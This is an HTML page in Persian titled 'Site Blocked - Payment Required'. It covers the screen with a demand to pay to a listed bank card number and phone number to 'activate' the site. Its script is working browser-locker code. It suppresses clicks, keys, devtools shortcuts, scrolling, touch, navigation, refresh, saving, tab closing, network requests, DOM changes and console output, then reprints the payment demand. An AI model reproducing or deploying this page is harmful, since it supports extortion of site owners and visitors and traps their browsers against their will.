<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Blocked - Payment Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            overflow: hidden;
            touch-action: none;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            cursor: default;
        }
        
        .fullscreen-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 9999;
            pointer-events: none;
        }
        
        .block-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }

        /* جلوگیری از کلیک راست و انتخاب متن */
        body {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        /* جلوگیری از کشیدن تصویر */
        img {
            -webkit-user-drag: none;
            -khtml-user-drag: none;
            -moz-user-drag: none;
            -o-user-drag: none;
            user-drag: none;
        }

        /* مخفی کردن اسکرول بار */
        ::-webkit-scrollbar {
            display: none;
        }

        /* جلوگیری از زوم در موبایل */
        body {
            touch-action: none;
            -ms-touch-action: none;
        }
    </style>
</head>
<body>
    <!-- تصویر pay.png به صورت تمام صفحه -->
    <img src="pay.png" alt="Payment Required" class="fullscreen-image" id="paymentImage">

    <!-- لایه مسدود کننده -->
    <div class="block-overlay" id="blockOverlay">
        <div>
            <h1 style="font-size: 2em; margin-bottom: 20px; color: #ff4444;">سایت مسدود شده است</h1>
            <p style="font-size: 1.2em; margin-bottom: 30px;">لطفاً برای فعال‌سازی سایت، هزینه را پرداخت کنید</p>
            <div style="background: rgba(255, 255, 255, 0.1); padding: 20px; border-radius: 10px; margin-bottom: 20px;">
                <p style="font-family: monospace; font-size: 1.1em; direction: ltr;">6104-3387-7673-3749</p>
                <p style="margin-top: 10px;">شماره کارت</p>
            </div>
            <p style="color: #ffaa00;">تلفن: ۰۹۱۳۴۲۰۲۰۷۶</p>
        </div>
    </div>

    <script>
        // مسدود کردن تمام تعاملات
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });

        // مسدود کردن کلیدها
        document.addEventListener('keydown', function(e) {
            // مسدود کردن F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && e.key === 'I') || 
                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
                (e.ctrlKey && e.key === 'u') ||
                e.key === 'Escape') {
                e.preventDefault();
                return false;
            }
        });

        // مسدود کردن کلیک‌ها
        document.addEventListener('click', function(e) {
            e.preventDefault();
            return false;
        });

        // مسدود کردن اسکرول
        document.addEventListener('wheel', function(e) {
            e.preventDefault();
            return false;
        }, { passive: false });

        // مسدود کردن تاچ
        document.addEventListener('touchstart', function(e) {
            e.preventDefault();
            return false;
        }, { passive: false });

        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
            return false;
        }, { passive: false });

        document.addEventListener('touchend', function(e) {
            e.preventDefault();
            return false;
        }, { passive: false });

        // مسدود کردن دبل کلیک
        document.addEventListener('dblclick', function(e) {
            e.preventDefault();
            return false;
        });

        // مسدود کردن درگ و دراپ
        document.addEventListener('dragstart', function(e) {
            e.preventDefault();
            return false;
        });

        document.addEventListener('drop', function(e) {
            e.preventDefault();
            return false;
        });

        // جلوگیری از باز کردن دِولوپر تولز با روش‌های مختلف
        document.addEventListener('keydown', function(e) {
            // Ctrl+Shift+C
            if (e.ctrlKey && e.shiftKey && e.key === 'C') {
                e.preventDefault();
                return false;
            }
            // Ctrl+Shift+K (Firefox)
            if (e.ctrlKey && e.shiftKey && e.key === 'K') {
                e.preventDefault();
                return false;
            }
        });

        // جلوگیری از تغییر اندازه پنجره
        window.addEventListener('resize', function() {
            window.resizeTo(screen.width, screen.height);
        });

        // جلوگیری از بسته شدن تب
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
        });

        // جلوگیری از باز کردن پنجره جدید
        window.addEventListener('blur', function() {
            window.focus();
        });

        // نمایش پیام در کنسول
        console.log('%c🚫 دسترسی مسدود شده است', 'color: red; font-size: 24px; font-weight: bold;');
        console.log('%cلطفاً برای فعال‌سازی سایت، هزینه را پرداخت کنید', 'color: orange; font-size: 16px;');

        // غیرفعال کردن کلیک راست روی تصویر
        const paymentImage = document.getElementById('paymentImage');
        paymentImage.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });

        // جلوگیری از باز کردن لینک‌ها
        document.addEventListener('click', function(e) {
            if (e.target.tagName === 'A' || e.target.closest('a')) {
                e.preventDefault();
                return false;
            }
        });

        // جلوگیری از فوکوس روی المنت‌ها
        document.addEventListener('focus', function(e) {
            e.target.blur();
        }, true);

        // مسدود کردن کلیه events
        const events = ['mousedown', 'mouseup', 'mousemove', 'mouseenter', 'mouseleave', 
                       'keydown', 'keyup', 'keypress', 'input', 'change', 'submit', 'reset',
                       'focus', 'blur', 'select', 'copy', 'cut', 'paste'];

        events.forEach(function(event) {
            document.addEventListener(event, function(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
        });

        // جلوگیری از تغییر URL
        window.addEventListener('hashchange', function(e) {
            e.preventDefault();
            window.location.hash = '';
        });

        // جلوگیری از back/forward
        window.addEventListener('popstate', function(e) {
            e.preventDefault();
            history.pushState(null, null, window.location.href);
        });

        // تنظیم history state
        history.pushState(null, null, window.location.href);

        // جلوگیری از refresh با Ctrl+R
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'r') {
                e.preventDefault();
                return false;
            }
        });

        // نمایش پیام هر 30 ثانیه
        setInterval(function() {
            console.log('%c💳 لطفاً هزینه سایت را پرداخت کنید: 6104-3387-7673-3749', 'color: red; font-size: 16px;');
        }, 30000);

        // تلاش برای جلوگیری از بسته شدن تب
        window.onbeforeunload = function() {
            return "سایت مسدود شده است. برای خروج از کلیدهای سیستم استفاده کنید.";
        };

        // غیرفعال کردن کلیه فرم‌ها
        document.addEventListener('submit', function(e) {
            e.preventDefault();
            return false;
        });

        // جلوگیری از auto-complete
        document.addEventListener('autocomplete', function(e) {
            e.preventDefault();
            return false;
        });

        // مسدود کردن print
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'p') {
                e.preventDefault();
                return false;
            }
        });

        // جلوگیری از save page
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 's') {
                e.preventDefault();
                return false;
            }
        });

        // مخفی کردن cursor
        document.body.style.cursor = 'none';

        // جلوگیری از تغییر اندازه فونت
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && (e.key === '+' || e.key === '-' || e.key === '0')) {
                e.preventDefault();
                return false;
            }
        });

        // مسدود کردن inspect element از طریق منو
        document.addEventListener('DOMContentLoaded', function() {
            if (document.body) {
                document.body.setAttribute('oncontextmenu', 'return false');
                document.body.setAttribute('onselectstart', 'return false');
                document.body.setAttribute('ondragstart', 'return false');
            }
        });

        // جلوگیری از باز کردن لینک در تب جدید
        document.addEventListener('auxclick', function(e) {
            if (e.button === 1) { // middle click
                e.preventDefault();
                return false;
            }
        });

        // غیرفعال کردن کلیه لینک‌ها
        document.querySelectorAll('a').forEach(function(link) {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                return false;
            });
            link.style.pointerEvents = 'none';
        });

        // جلوگیری از load شدن iframe
        document.addEventListener('load', function(e) {
            if (e.target.tagName === 'IFRAME') {
                e.target.style.display = 'none';
            }
        }, true);

        // مسدود کردن کلیه AJAX requests
        const originalXHR = window.XMLHttpRequest;
        window.XMLHttpRequest = function() {
            const xhr = new originalXHR();
            const originalOpen = xhr.open;
            xhr.open = function() {
                return false;
            };
            return xhr;
        };

        // مسدود کردن fetch
        window.fetch = function() {
            return Promise.reject(new Error('Blocked'));
        };

        // جلوگیری از تغییر DOM
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                mutation.addedNodes.forEach(function(node) {
                    if (node.nodeType === 1) { // Element node
                        document.body.removeChild(node);
                    }
                });
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });

        // نمایش هشدار هنگام تلاش برای خروج
        window.addEventListener('beforeunload', function(e) {
            const confirmationMessage = 'سایت مسدود شده است. برای خروج از کلیدهای سیستم استفاده کنید.';
            e.returnValue = confirmationMessage;
            return confirmationMessage;
        });

        // جلوگیری از تغییر title
        let originalTitle = document.title;
        Object.defineProperty(document, 'title', {
            get: function() {
                return originalTitle;
            },
            set: function(value) {
                // جلوگیری از تغییر title
            }
        });

        // مسدود کردن console methods
        console.log = function() {};
        console.warn = function() {};
        console.error = function() {};
        console.info = function() {};
        console.debug = function() {};

        // اما یک پیام مهم نمایش می‌دهیم
        setTimeout(function() {
            console.log('%c💸 PAYMENT REQUIRED 💸', 'color: red; font-size: 32px; font-weight: bold; text-shadow: 2px 2px 4px #000;');
            console.log('%cشماره کارت: 6104-3387-7673-3749', 'color: yellow; font-size: 18px;');
            console.log('%cتلفن: 09134202076', 'color: cyan; font-size: 16px;');
        }, 1000);

    </script>
</body>
</html>
